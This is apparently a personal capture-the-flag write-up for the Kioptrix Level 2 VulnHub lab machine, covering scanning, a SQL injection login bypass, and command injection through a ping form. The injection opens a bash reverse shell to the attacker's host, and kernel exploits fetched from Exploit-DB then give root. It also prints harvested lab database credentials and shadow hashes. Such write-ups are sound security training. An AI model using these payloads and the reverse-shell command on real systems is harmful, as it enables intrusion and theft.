# Kioptrix Level 2 (1.2)

This machine was released in 2011, being the second machine belonging to the Kioptrix series of vulnerable machines in Vulnhub. <br>
Here's a link to the machine: <a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">https://www.vulnhub.com/entry/kioptrix-level-11-2,23/</a>. 

In this writeup, I will go over how I obtained root in this machine and explain my exploitation process from Installation to Exploitation.

## Installation
Our machine is going to be installed similarly to Kioptrix 1 (reference: <a href="https://benheater.com/proxmox-running-kioptrix-level-1/">https://benheater.com/proxmox-running-kioptrix-level-1/</a>). <br>
However, a DHCP server is necessary to assign an IP address to our machine. <br>
Here's a quick guide to setting up a DHCP server in the Kali attacker directed at machines on eth2, the network bridge I configured to isolate Vulnhub machines. <br>

### DHCP Setup
1. Install isc-dhcp-server: `sudo apt install isc-dhcp-server -y`
2. Configure the DHCP server: <br>
Delete everything and replace it with:
```
default-lease-time 600; 
max-lease-time 7200; 

subnet 10.0.1.0 netmask 255.255.255.0 { 
	range 10.0.1.100 10.0.1.200; 
	option routers 10.0.1.5; 
}
```

10.0.1.5 is the IP address of my Kali machine in eth2. The IP addresses will be assigned in the range of 10.0.1.100 - 200. Modify these values depending on your specific setup.

3. Tell DHCP to listen on eth2
- `sudo nano /etc/default/isc-dhcp-server`
- Find `INTERFACESv4=""` and change it to: `INTERFACESv4="eth2"`

4. Start and Enable the Service:
```bash
sudo systemctl start isc-dhcp-server
sudo systemctl enable isc-dhcp-server

sudo systemctl status isc-dhcp-server
```

5. Find IP address of vulnerable machine <br>
Use any of the following commands:
```bash
nmap -sn 10.0.1.0/24
sudo arp-scan --interface=eth2 --localnet
```

Here's a screenshot of Kioptrix receiving an IP address from 10.0.1.5, the Kali attacker. <br>
<img width="885" height="500" alt="image" src="https://github.com/user-attachments/assets/ec52e6dd-4049-402e-a1f8-bd32da577439" />

We can now continue with our standard boot2root operations.

## Enumeration
Firstly, let's find the IP address of our machine.

```bash
┌──(kali㉿kali-attacker-0)-[~/BOXES/Kioptrix/Lvl2]
└─$ sudo arp-scan --interface=eth2 -l
Interface: eth2, type: EN10MB, MAC: bc:24:11:b4:13:a7, IPv4: 10.0.1.5
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.1.101      bc:24:11:a5:f6:de       (Unknown)

1 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.060 seconds (124.27 hosts/sec). 1 responded
```

Let's continue our enumeration with nmap.
```bash
┌──(kali㉿kali-attacker-0)-[~/BOXES/Kioptrix/Lvl2]
└─$ nmap 10.0.1.101 -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-28 14:26 MDT
Nmap scan report for 10.0.1.101
Host is up (0.0022s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      CUPS 1.1
705/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql?
MAC Address: BC:24:11:A5:F6:DE (Proxmox Server Solutions GmbH)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.08 seconds
```

Let's check the web application running on port 80. <br>
<img width="559" height="230" alt="image" src="https://github.com/user-attachments/assets/2e2585ce-0381-440b-b620-aa736d04375a" />

This looks like a barebones login system, it should be easy to break into it. I tried default credentials for common services (admin, root, guest, etc.) but they didn't work. <br>
Looking at the source code of the page with CTRL+U, we can find something interesting on line 28:
```html
<!-- Start of HTML when logged in as Administator -->
```

There might be an 'admin' or 'Administrator' user in the system. Let's keep using the username 'admin'.

## Initial Exploitation - SQLi

Going back at our nmap scans, we can see a MySQL service running in port 3306. We could try getting access to the system through SQLi.

I researched common payloads for MySQL systems and I found something userful on PayloadsAllTheThings: (<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-testing-injection">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-testing-injection</a>). <br>
I tried using the injections in the Login section with these creds `admin / ' OR 1 -- -`. Now, we submit our payload... <br>
<img width="622" height="187" alt="image" src="https://github.com/user-attachments/assets/4a4eecf3-8b34-46bd-9f75-168f22b19ea9" />

We have access to the portal!

## User Access - Command Injection
Let's try running the application as expected with the input `10.0.1.5`. <br>
<img width="553" height="255" alt="image" src="https://github.com/user-attachments/assets/5d2344aa-6f8d-40c8-b571-d6b115a8c776" />

This looks like the output of the `ping` command. I wonder if we can execute anything else by abusing how Bash interprets multiple commands in a single line. <br>
Let's try `; whoami`. <br>
<img width="535" height="204" alt="image" src="https://github.com/user-attachments/assets/59e517b9-263a-4db9-b5a0-6b78f0a5321f" />

We have command injection! Let's start a reverse shell back to our machine.
```bash
# on kali
nc -lvnp 7777

# type this in the web application
; sh -i >& /dev/tcp/10.0.0.5/7777 0>&1
```
<br>
<img width="456" height="149" alt="image" src="https://github.com/user-attachments/assets/57ba2584-2145-4255-a3f6-5e1029e85e22" />

We have **user** access!

## Privilege Escalation
I used two different methods to obtain root access: running a public kernel exploit from Google and using the LinPEAS script.

### Kernel Public Exploit
```bash
sh-3.00$ uname -r
2.6.9-55.EL
```

Looking up "linux kernel 2.6.9-55.EL exploit db" on Google will return many public exploits for the version of the Linux kernel. <br>
Let's use the first result: <a href="https://www.exploit-db.com/exploits/9542">https://www.exploit-db.com/exploits/9542</a>

Let's download that exploit on our Kali machine and transfer it to the machine to get root.
```bash
# on kali
┌──(kali㉿kali-attacker-0)-[~/BOXES/Kioptrix/Lvl2]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...


# on victim
sh-3.00$ wget http://10.0.1.5:8080/9542.c
--21:18:29--  http://10.0.1.5:8080/9542.c
           => `9542.c'
Connecting to 10.0.1.5:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2,643 (2.6K) [text/x-csrc]

    0K ..                                                    100%  148.27 MB/s

21:18:29 (148.27 MB/s) - `9542.c' saved [2643/2643]

sh-3.00$ gcc 9542.c -o 9542
9542.c:109:28: warning: no newline at end of file
sh-3.00$ ./9542
sh: no job control in this shell
sh-3.00# whoami
root
```

We have **root** access!

### LinPEAS findings

It seems this Linux kernel version is vulnerable to MULTIPLE exploits. <br>
I downloaded LinPEAS.sh to use for privilege escalation and this is what I found when running the script. <br>
<img width="996" height="658" alt="image" src="https://github.com/user-attachments/assets/95c652a5-7c04-4c1b-81a0-f81a18356939" />

Let us remember that the legend shown at the start of the execution of linpeas.sh reads "`RED/YELLOW: 95% a PE vector`". There are tons of routes for privesc... <br>

I tried running them in order. `american-sign-language` and `half-nelson` failed to compile on the target machine and I didn't know how to run `pktcdvd`. <br>
`wunderbar_emporium` was the exploit I used to gain privilege escalation on my first run. <br>
You can download the script from <a href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/9435.tgz">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/9435.tgz</a> and follow the instructions ("use ./wunderbar_emporium.sh for everything").

### wunderbar_emporium exploit

```bash
# on attacker
# link found on the exploit db site
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/9435.tgz
gunzip 9435.tgz
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.0.1.101 - - [27/Mar/2026 21:34:02] "GET /9435.tar HTTP/1.0" 200 
```
```bash
# on victim
sh-3.00$ wget http://10.0.1.5:8080/9435.tar
--03:34:01--  http://10.0.1.5:8080/9435.tar
           => `9435.tar'
Connecting to 10.0.1.5:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4,198,400 (4.0M) [application/x-tar]
...
03:34:01 (25.68 MB/s) - `9435.tar' saved [4198400/4198400]

sh-3.00$ ls
9435.tar
linpeas.sh
uscreens
sh-3.00$ tar -xvf 9435.tar
wunderbar_emporium/
wunderbar_emporium/pwnkernel.c
wunderbar_emporium/tzameti.avi
wunderbar_emporium/wunderbar_emporium.sh
wunderbar_emporium/exploit.c
sh-3.00$ cd wunderbar_emporium
sh-3.00$ ./wunderbar_emporium.sh
sh: mplayer: command not found
sh: no job control in this shell
sh-3.00# whoami
root
```
<img width="643" height="354" alt="image" src="https://github.com/user-attachments/assets/9c5146d5-e3d5-4cc2-83d1-d6c66431bb34" />

We have **root** access!

## Other Findings
### MySQL Database - webapp

I spent about half an hour looking at the database for the web application before actually trying to do privilege escalation. 
Nothing really useful was found apart from the user credentials inside the applications. Inside the directory we spawn in, we can find the full versions of the `index.php` and `pingit.php` files used in the web application. 
The `index.php` file contains plaintext credentials for the user `john` to interact with the database.

```bash
sh-3.00$ head index.php
<?php
        mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
        //print "Connected to MySQL<br />";
        mysql_select_db("webapp");
```

Let's connect to the MySQL service on the machine.
```bash
sh-3.00$ mysql -h localhost -u john -p
Enter password: hiroshima
\h
?         (\?) Synonym for `help'.

...
```

Interaction with the MySQL service is quite strange... <br>
To receive the output of your commands, you must quit your session (`\q`) and the output will be displayed.

```bash
sh-3.00$ mysql -h localhost -u john -p
Enter password: hiroshima
\G show databases
\u webapp
\G show tables
\q
*************************** 1. row ***************************
Database: mysql
*************************** 2. row ***************************
Database: test
*************************** 3. row ***************************
Database: webapp
Tables_in_webapp
users
sh-3.00$
```

Anyways, here's the whole database used in `webapp`.
```bash
sh-3.00$ mysql -u john -h localhost -phiroshima
\u webapp
\G SELECT * FROM users
\q
id      username        password
1       admin   5afac8d85f
2       john    66lajGGbla

```

I tried to ssh with these creds, but I was unsuccessful. 
These creds DO work with the webapp, which is neat. 
Logging in with `admin` creds displays the ping utility we used to get User Access. Using the `john` creds leads to an empty screen.

Here's the `/etc/shadow` hashes. I was also unable to crack them with rockyou.txt.
```bash
root:$1$FTpMLT88$VdzDQTTcksukSKMLRSVlc.:14529:0:99999:7:::
john:$1$wk7kHI5I$2kNTw6ncQQCecJ.5b8xTL1:14525:0:99999:7:::
harold:$1$7d.sVxgm$3MYWsHDv0F/LP.mjL9lp/1:14529:0:99999:7:::
```

`/var/mail/root` didn't really show anything interesting, just some automated log thing with LogWatch:
```bash
------------------ Disk Space --------------------

/dev/mapper/VolGroup00-LogVol00
                      3.3G  1.5G  1.7G  47% /
/dev/hda1              99M  9.3M   85M  10% /boot


 ###################### LogWatch End ######################### 


--q1A3dxnO003116.1328845199/kioptrix.level2--


--62S60gYE002529.1774677642/kioptrix.level2--

sh-3.00# mail
Mail version 8.1 6/6/93.  Type ? for help.
"/var/mail/root": 1 message 1 unread
>U  1 MAILER-DAEMON@kioptr  Sat Mar 28 02:00 137/4364  "Postmaster notify: se"
q
Held 1 message in /var/mail/root
sh-3.00#
```

Let's edit `/etc/issue` again with `wget http://10.0.1.5:8080/new_msg.txt` and `mv new_msg.txt /etc/issue` to finalize. <br>
<img width="898" height="496" alt="image" src="https://github.com/user-attachments/assets/57774c38-91ed-4366-a7c2-1c72f50f1620" />

※ This is the end of this writeup. Hope I can continue writing about this series of VMs!

